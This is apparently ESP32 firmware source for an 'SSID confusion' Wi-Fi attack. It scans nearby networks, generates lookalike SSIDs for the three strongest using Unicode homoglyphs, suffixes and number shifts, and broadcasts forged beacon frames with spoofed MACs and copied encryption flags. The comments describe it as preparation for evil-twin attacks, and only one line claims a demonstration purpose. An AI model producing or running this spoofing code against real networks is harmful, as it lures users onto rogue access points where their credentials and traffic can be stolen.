/**
 * ssid_confusion.cpp — SSID Confusion Attack (Improved)
 * -------------------------------------------------------
 * Scans for nearby networks then floods the air with visually
 * indistinguishable variants of those SSIDs.
 *
 * IMPROVEMENTS over original:
 *
 * 1. TARGETS TOP 3 NETWORKS BY SIGNAL — not just the first found.
 *    Strong-signal networks are the ones users trust most.
 *
 * 2. UNICODE HOMOGLYPH SUBSTITUTIONS — replaces letters with
 *    visually identical Unicode characters that most devices render
 *    the same way. e.g. 'o' → 'ο' (Greek omicron, U+03BF).
 *    These are completely different SSIDs to the protocol but look
 *    identical on screen. Extremely effective for evil twin prep.
 *
 * 3. MORE INTELLIGENT SUFFIX VARIANTS — uses ISP-specific patterns.
 *    If the target is "SKY12345", we generate "SKY12345_5GHz",
 *    "SKY12346" (increment), "SKY12344" (decrement), etc.
 *
 * 4. RETAINS REAL ENCRYPTION FLAGS — copies the target's capability
 *    bits (WPA2/open) so the fake AP looks identical in scanners.
 *
 * Use case: demonstrates how SSIDs cannot be trusted as identifiers
 * and why BSSID pinning / certificate pinning are necessary.
 */
#include "ssid_confusion.h"
#include <WiFi.h>
#include <string.h>

static uint8_t conf_pkt[128];

// Beacon frame template
static const uint8_t BEACON_BASE[] = {
  0x80,0x00, 0x00,0x00,                   // Frame Control (beacon), Duration
  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,           // DA: broadcast
  0x00,0x00,0x00,0x00,0x00,0x00,           // SA: filled per SSID
  0x00,0x00,0x00,0x00,0x00,0x00,           // BSSID: filled per SSID
  0x00,0x00,                               // Sequence control
  0x83,0x51,0xf7,0x8f,0x0f,0x00,0x00,0x00, // Timestamp
  0x64,0x00,                               // Beacon interval: 100 TU
  0x31,0x04,                               // Capability: ESS + Privacy (WPA2)
};

// Homoglyph table: ASCII char → Unicode lookalike (UTF-8 encoded)
// These look identical on most phones but are different bytes
struct Homoglyph { char orig; const char* repl; };
static const Homoglyph GLYPHS[] = {
  {'a', "\xCE\xB1"},  // α (Greek alpha)  looks like 'a'
  {'e', "\xCE\xB5"},  // ε (Greek epsilon) looks like 'e'
  {'o', "\xCE\xBF"},  // ο (Greek omicron) looks like 'o'
  {'i', "\xCE\xB9"},  // ι (Greek iota)    looks like 'i'
  {'n', "\xCE\xB7"},  // η (Greek eta)     looks like 'n'
  {'A', "\xCE\x91"},  // Α (Greek Alpha)   looks like 'A'
  {'B', "\xCE\x92"},  // Β (Greek Beta)    looks like 'B'
  {'E', "\xCE\x95"},  // Ε (Greek Epsilon) looks like 'E'
  {'O', "\xCE\x9F"},  // Ο (Greek Omicron) looks like 'O'
  {'0', "\xC2\xBA"},  // º (masculine ordinal) looks like '0'
  {'l', "\xC7\x80"},  // ǀ (Latin pipe)    looks like 'l'
  {'I', "\xC4\xBB"},  // Ļ → use '|' instead
};
static const int N_GLYPHS = 12;

// Standard suffix variants
static const char* SUFFIXES[] = {
  " ","_2","-2","_5G","_5GHz","_2G","_2.4G",
  " (2)","_EXT","-EXT","_FAST","_Plus","_HD","_N",
  "_NEW","_FREE"," FREE","-Guest","_Guest",
};
static const int N_SUFFIX = 19;

// All generated variant SSIDs
static char _variants[80][65]; // up to 80 variants, 64 chars max (homoglyphs expand)
static int  _varCount = 0;
static int  _sendIdx  = 0;

// Encryption type of the targets (copy their capability bits)
static uint16_t _targetCaps[3] = {0x0431, 0x0431, 0x0431};

static void addVariant(const char* s) {
  if(_varCount >= 80) return;
  int len = strlen(s);
  if(len == 0 || len > 64) return;
  // Deduplicate
  for(int i=0;i<_varCount;i++)
    if(strcmp(_variants[i], s)==0) return;
  strncpy(_variants[_varCount], s, 64);
  _variants[_varCount][64] = '\0';
  _varCount++;
}

// Generate a homoglyph version of the SSID
// Replaces one character at a time to create multiple subtle variants
static void addHomoglyphs(const String& base) {
  for(int g=0; g<N_GLYPHS; g++) {
    String v = base;
    bool found = false;
    for(int c=0; c<(int)v.length(); c++) {
      if(v[c] == GLYPHS[g].orig) {
        // Build the new string with replacement at position c
        String result = v.substring(0,c) + String(GLYPHS[g].repl) + v.substring(c+1);
        if(result.length() <= 32) { // keep within 802.11 SSID limit
          addVariant(result.c_str());
          found = true;
          break; // one substitution per glyph type
        }
      }
    }
    if(!found) continue;
  }
}

// Generate numeric increment/decrement variants
// e.g. "SKY12345" → "SKY12346", "SKY12344"
static void addNumericVariants(const String& base) {
  // Find the last run of digits in the string
  int numStart = -1, numEnd = -1;
  for(int i=base.length()-1; i>=0; i--) {
    if(isdigit(base[i])) {
      numEnd = (numEnd==-1) ? i : numEnd;
      numStart = i;
    } else if(numEnd != -1) break;
  }
  if(numStart == -1) return; // no digits found

  String prefix = base.substring(0, numStart);
  String numStr = base.substring(numStart, numEnd+1);
  String suffix = base.substring(numEnd+1);
  int num = numStr.toInt();

  // +1, -1, +2 variants
  for(int delta : {1, -1, 2}) {
    int newNum = num + delta;
    if(newNum < 0) continue;
    String v = prefix + String(newNum) + suffix;
    if(v.length() <= 32) addVariant(v.c_str());
  }
}

void SSIDConfusion::begin() { _running=false; _sent=0; }

bool SSIDConfusion::start() {
  _varCount=0; _sendIdx=0; _sent=0; _lastTx=0;

  Serial.println("SSIDConf: scanning for targets...");
  int found = WiFi.scanNetworks(false, false);

  if(found > 0) {
    // Sort by RSSI - pick top 3 strongest signals (most trusted networks)
    int top[3] = {-1,-1,-1};
    int topRSSI[3] = {-999,-999,-999};
    for(int i=0; i<found; i++) {
      int rssi = WiFi.RSSI(i);
      if(WiFi.SSID(i).length()==0) continue;
      for(int t=0; t<3; t++) {
        if(rssi > topRSSI[t]) {
          // Shift down
          if(t<2){ top[2]=top[1]; topRSSI[2]=topRSSI[1]; }
          if(t<1){ top[1]=top[0]; topRSSI[1]=topRSSI[0]; }
          top[t]=i; topRSSI[t]=rssi; break;
        }
      }
    }

    // Generate variants for each of the top 3
    for(int t=0; t<3; t++) {
      if(top[t]<0) continue;
      String base = WiFi.SSID(top[t]);
      int enc = WiFi.encryptionType(top[t]);

      // Store capability bits to copy later
      // WPA2 = 0x0431 (ESS+Privacy), Open = 0x0421 (ESS only)
      _targetCaps[t] = (enc != WIFI_AUTH_OPEN) ? 0x0431 : 0x0421;

      Serial.printf("SSIDConf: target[%d] = \"%s\" (%d dBm)\n",
                    t, base.c_str(), topRSSI[t]);

      // 1. Exact copy (same name, different MAC = evil twin)
      addVariant(base.c_str());

      // 2. Standard suffix variants
      for(int s=0; s<N_SUFFIX; s++) {
        String v = base + String(SUFFIXES[s]);
        if(v.length()<=32) addVariant(v.c_str());
      }

      // 3. Homoglyph substitutions (visually identical, different bytes)
      addHomoglyphs(base);

      // 4. Numeric variants (increment/decrement the number suffix)
      addNumericVariants(base);

      // 5. Lowercase/uppercase variants
      String lower = base; lower.toLowerCase();
      String upper = base; upper.toUpperCase();
      if(lower != base) addVariant(lower.c_str());
      if(upper != base) addVariant(upper.c_str());
    }
    WiFi.scanDelete();
  } else {
    // Fallback: common UK/Irish ISP names with variants
    const char* bases[] = {"BTHub6","SKY","VirginMedia","EE-BrightBox","eircom"};
    for(int b=0; b<5; b++) {
      addVariant(bases[b]);
      for(int s=0; s<4; s++) {
        String v = String(bases[b]) + String(SUFFIXES[s]);
        addVariant(v.c_str());
      }
    }
  }

  if(_varCount==0) { Serial.println("SSIDConf: no variants generated"); return false; }

  _running=true;
  Serial.printf("SSIDConf: started — %d variants\n", _varCount);
  return true;
}

void SSIDConfusion::stop() {
  _running=false;
  Serial.printf("SSIDConf: stopped — %d frames sent\n", _sent);
}

void SSIDConfusion::tick() {
  if(!_running || _varCount==0) return;
  uint32_t now = millis();
  if(now - _lastTx < 60) return; // faster than original (60ms vs 80ms)
  _lastTx = now;

  const char* ssid = _variants[_sendIdx % _varCount];
  int sidx = _sendIdx % _varCount;
  _sendIdx++;

  uint8_t slen = (uint8_t)strlen(ssid);
  if(slen > 32) slen = 32;

  // Build beacon frame dynamically
  int pos = 0;
  memcpy(conf_pkt, BEACON_BASE, sizeof(BEACON_BASE));
  pos = sizeof(BEACON_BASE);

  // Set unique MAC for each SSID index (based on index so same SSID = same MAC)
  conf_pkt[10] = 0xDE; conf_pkt[11] = 0xAD; conf_pkt[12] = 0xBE;
  conf_pkt[13] = (sidx >> 8) & 0xFF;
  conf_pkt[14] = sidx & 0xFF;
  conf_pkt[15] = 0xAA;
  memcpy(&conf_pkt[16], &conf_pkt[10], 6); // BSSID = source MAC

  // Copy capability bits from target (preserve WPA2 vs open)
  int targetIdx = (sidx / ((_varCount/3)+1)) % 3;
  conf_pkt[34] = _targetCaps[targetIdx] & 0xFF;
  conf_pkt[35] = (_targetCaps[targetIdx] >> 8) & 0xFF;

  // SSID IE
  conf_pkt[pos++] = 0x00;  // tag = SSID
  conf_pkt[pos++] = slen;
  memcpy(&conf_pkt[pos], ssid, slen); pos += slen;

  // Supported Rates IE
  conf_pkt[pos++]=0x01; conf_pkt[pos++]=0x08;
  conf_pkt[pos++]=0x82; conf_pkt[pos++]=0x84;
  conf_pkt[pos++]=0x8b; conf_pkt[pos++]=0x96;
  conf_pkt[pos++]=0x24; conf_pkt[pos++]=0x30;
  conf_pkt[pos++]=0x48; conf_pkt[pos++]=0x6c;

  // DS Parameter Set (channel)
  conf_pkt[pos++]=0x03; conf_pkt[pos++]=0x01;
  conf_pkt[pos++]=1; // channel 1 (our AP home channel)

  for(int r=0;r<2;r++){
    if(esp_wifi_80211_tx(WIFI_IF_STA, conf_pkt, pos, false)==ESP_OK) _sent++;
    delay(1);
  }
}
